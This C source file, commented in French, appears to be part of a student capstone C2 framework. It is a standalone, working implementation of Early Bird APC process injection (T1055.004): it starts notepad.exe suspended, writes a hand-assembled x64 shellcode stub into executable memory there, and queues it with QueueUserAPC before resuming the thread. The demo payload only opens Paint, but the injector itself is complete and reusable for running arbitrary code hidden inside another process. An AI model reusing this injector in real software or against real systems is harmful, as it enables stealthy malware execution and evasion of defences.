/*
 * ============================================================
 *  apcinject_standalone.c — Test autonome de la technique
 *  Early Bird APC Injection (T1055.004)
 *
 *  Objectif :
 *    Tester la technique apcinject SANS le framework C2.
 *    Un exe independant qui :
 *      1. Spawne notepad.exe en SUSPENDU
 *      2. Injecte un shellcode WinExec("mspaint.exe")
 *         via QueueUserAPC (Early Bird)
 *      3. Verifie que Paint s'est bien ouvert
 *
 *  Usage :
 *    apcinject_test.exe              → cible notepad.exe
 *    apcinject_test.exe <processus>  → cible choisie
 *
 *  Compilation (MSYS2 MinGW64) :
 *    x86_64-w64-mingw32-gcc apcinject_standalone.c \
 *        -o apcinject_test.exe -O2 -Wall
 *
 *  Note : la cible doit tourner avec les memes privileges
 *         que cet exe (notepad.exe = OK sans admin).
 *
 *  Auteur  : El Mazdougui Anass
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ── Layout du stub 49 bytes (identique a apcinject_loader.c) ── */
#define STUB_STRING_OFFSET  0x25   /* offset de "mspaint.exe\0"  */
#define STUB_TOTAL_SIZE     49     /* code + string              */
#define STUB_STRPTR_OFF     0x02   /* placeholder adresse string */
#define STUB_FNPTR_OFF      0x11   /* placeholder adresse WinExec*/

#define WAIT_MS  5000

/* ============================================================
 *  Recherche d'un PID par nom de processus
 * ============================================================ */
static DWORD find_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ============================================================
 *  Construction du stub WinExec avec adresses resolues
 *
 *  WinExec est resolu dans NOTRE processus : les DLL systeme
 *  (kernel32.dll) sont chargees a la MEME adresse de base dans
 *  tous les processus de la machine → l'adresse est valide
 *  dans la cible aussi.
 * ============================================================ */
static unsigned char *build_winexec_stub(LPVOID remote_base, size_t *out_size) {
    HMODULE hk32 = GetModuleHandleA("kernel32.dll");
    if (!hk32) return NULL;

    FARPROC pWinExec = GetProcAddress(hk32, "WinExec");
    if (!pWinExec) return NULL;

    unsigned char *stub = (unsigned char *)malloc(STUB_TOTAL_SIZE);
    if (!stub) return NULL;

    /* Template : movabs rcx,... / mov edx,1 / movabs rax,...
       / sub rsp,28h / call rax / add rsp,28h / jmp $          */
    unsigned char tmpl[] = {
        0x48, 0xb9,                                     /* movabs rcx, imm64 */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <- string addr    */
        0xba, 0x01, 0x00, 0x00, 0x00,                   /* mov edx, 1        */
        0x48, 0xb8,                                     /* movabs rax, imm64 */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <- WinExec addr   */
        0x48, 0x83, 0xec, 0x28,                         /* sub rsp, 28h      */
        0xff, 0xd0,                                     /* call rax          */
        0x48, 0x83, 0xc4, 0x28,                         /* add rsp, 28h      */
        0xeb, 0xfe                                      /* jmp $ (APC-safe)  */
    };
    memcpy(stub, tmpl, sizeof(tmpl));

    /* String "mspaint.exe\0" apres le code */
    const char *cmd = "mspaint.exe";
    memcpy(stub + STUB_STRING_OFFSET, cmd, strlen(cmd) + 1);

    /* Patch : adresse de la string DANS LA CIBLE */
    ULONG_PTR str_remote = (ULONG_PTR)remote_base + STUB_STRING_OFFSET;
    memcpy(stub + STUB_STRPTR_OFF, &str_remote, sizeof(ULONG_PTR));

    /* Patch : adresse de WinExec (valide dans tous les processus) */
    ULONG_PTR fn_addr = (ULONG_PTR)pWinExec;
    memcpy(stub + STUB_FNPTR_OFF, &fn_addr, sizeof(ULONG_PTR));

    *out_size = STUB_TOTAL_SIZE;
    return stub;
}

/* ============================================================
 *  MAIN — demo complete avec verification
 * ============================================================ */
int main(int argc, char **argv) {
    /* ── Processus cible ─────────────────────────────────────── */
    char target[MAX_PATH];
    strncpy(target, (argc > 1) ? argv[1] : "notepad.exe", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    if (!strrchr(target, '.'))
        strcat(target, ".exe");

    printf("=== Early Bird APC Injection (T1055.004) — test autonome ===\n");
    printf("Cible            : %s\n", target);
    printf("Payload          : WinExec(\"mspaint.exe\", SW_SHOWNORMAL)\n\n");

    /* ── Paint deja lance ? (demo propre) ───────────────────── */
    DWORD paint_before = find_pid("mspaint.exe");
    if (paint_before) {
        printf("[!] mspaint.exe deja ouvert (PID %lu) — fermez-le pour une demo propre\n\n",
               (unsigned long)paint_before);
    }

    /* ── 1. Spawn de la cible en SUSPENDU ───────────────────── */
    char path[MAX_PATH] = {0};
    UINT n = GetSystemDirectoryA(path, sizeof(path));
    if (!n) { printf("[X] GetSystemDirectoryA echoue\n"); return 1; }
    snprintf(path + n, sizeof(path) - n, "\\%s", target);

    printf("[1] Spawn suspendu de %s ...\n", path);
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[X] CreateProcess echoue (err %lu)\n",
               (unsigned long)GetLastError());
        printf("    → La cible doit exister dans System32 et ne pas\n"
               "      requerir d'elevation (notepad.exe = OK).\n");
        return 1;
    }
    printf("    OK → PID=%lu  TID=%lu\n",
           (unsigned long)pi.dwProcessId,
           (unsigned long)pi.dwThreadId);

    /* ── 2. Allocation RWX dans la cible ────────────────────── */
    printf("[2] VirtualAllocEx(RWX, %d bytes) dans la cible...\n",
           STUB_TOTAL_SIZE);
    LPVOID remote_base = VirtualAllocEx(
        pi.hProcess, NULL, STUB_TOTAL_SIZE,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        printf("[X] VirtualAllocEx echoue (err %lu)\n",
               (unsigned long)GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("    OK → remote_base=%p\n", remote_base);

    /* ── 3. Construction du stub (WinExec resolu ici) ───────── */
    printf("[3] Construction du stub WinExec (49 bytes)...\n");
    size_t stub_size = 0;
    unsigned char *stub = build_winexec_stub(remote_base, &stub_size);
    if (!stub) {
        printf("[X] Construction du stub echouee\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("    OK → WinExec resolu dans notre processus ; adresse\n"
           "         valide dans la cible (DLL systeme = meme base partout)\n");

    /* ── 4. Ecriture du stub dans la cible ──────────────────── */
    printf("[4] WriteProcessMemory...\n");
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote_base, stub, stub_size, &written)
        || written != stub_size) {
        printf("[X] WriteProcessMemory echoue (err %lu)\n",
               (unsigned long)GetLastError());
        free(stub);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    free(stub);
    printf("    OK → %lu bytes ecrits @ %p\n",
           (unsigned long)written, remote_base);

    /* ── 5. File APC sur le thread principal suspendu ───────── */
    printf("[5] QueueUserAPC sur le thread principal suspendu...\n");
    if (!QueueUserAPC((PAPCFUNC)remote_base, pi.hThread, 0)) {
        printf("[X] QueueUserAPC echoue (err %lu)\n",
               (unsigned long)GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("    OK\n");

    /* ── 6. ResumeThread : l'APC se declenche AVANT le EP ───── */
    printf("[6] ResumeThread → l'APC s'execute AVANT le point d'entree\n");
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* ── 7. Verification : Paint s'est-il ouvert ? ──────────── */
    printf("    Attente de %d ms pour laisser WinExec lancer Paint...\n", WAIT_MS);
    Sleep(WAIT_MS);

    DWORD paint_after = find_pid("mspaint.exe");

    printf("\n=== RESULTAT ===\n");
    if (paint_after && paint_after != paint_before) {
        printf("[PASS] mspaint.exe lance (PID %lu) — injecte dans %s via APC\n",
               (unsigned long)paint_after, target);
        printf("       La technique Early Bird APC fonctionne.\n");
        return 0;
    }
    if (paint_before) {
        printf("[WARN] mspaint.exe etait deja ouvert avant le test —\n"
               "       verifiez le gestionnaire de taches manuellement.\n");
        return 0;
    }
    printf("[FAIL] mspaint.exe non detecte apres l'injection\n");
    printf("       → La cible %s (PID %lu) est-elle encore vivante ?\n",
           target, (unsigned long)pi.dwProcessId);
    return 1;
}
